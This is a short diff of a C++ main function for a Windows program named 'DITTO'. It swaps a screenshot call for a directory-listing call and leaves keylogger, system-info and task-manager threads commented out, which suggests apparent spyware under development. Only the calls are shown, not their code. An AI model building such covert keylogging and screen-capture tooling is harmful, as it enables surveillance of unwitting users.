@@ -17,10 +17,14 @@ int main()
 	{
 		Logger::Instance().info(L"<<<<<<<<<<<<<<<<< DITTO IS RUNNING >>>>>>>>>>>>>>>>>>>");
 
-		Screen::instance().take_shot();
+		//Screen::instance().take_shot();
 
 		//BatteryUtils::save_battery_info();
 		//SystemInfo::save_system_info();
+
+		//SystemUtils::get_process_id(L"");
+		SystemUtils::get_dir_list();
+
 
 		//Thread key_logger_thread{ reinterpret_cast<LPTHREAD_START_ROUTINE>(&KeyLogger::start), nullptr };
 		//KeyLogger key_logger;
@@ -28,7 +32,6 @@ int main()
 		
 		//tskmgr_thread.run();
 		//tskmgr_thread.wait();
-
 	}
 	catch (WindowsException exp)
 	{
